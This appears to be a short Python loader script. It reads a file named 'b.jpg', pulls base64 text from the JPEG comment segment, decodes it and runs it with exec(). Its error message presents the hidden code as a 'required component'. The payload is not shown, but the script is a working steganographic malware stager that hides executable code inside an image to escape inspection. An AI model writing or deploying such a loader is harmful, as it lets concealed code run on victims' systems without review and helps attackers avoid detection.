import base64
import os
import sys

def extract_from_jpg(jpg_path):
    with open(jpg_path, 'rb') as f:
        data = f.read()
    
    comment_marker = b'\xFF\xFE'
    pos = data.find(comment_marker)
    if pos != -1:
        code_start = pos + 4
        end_pos = data.find(b'\xFF', code_start)
        if end_pos == -1:
            end_pos = len(data)
        encoded_code = data[code_start:end_pos]
        return base64.b64decode(encoded_code)
    return None

embedded_code = extract_from_jpg('b.jpg')
if embedded_code:
    exec(embedded_code)
else:
    print("Error: Required component not found")
    sys.exit(1)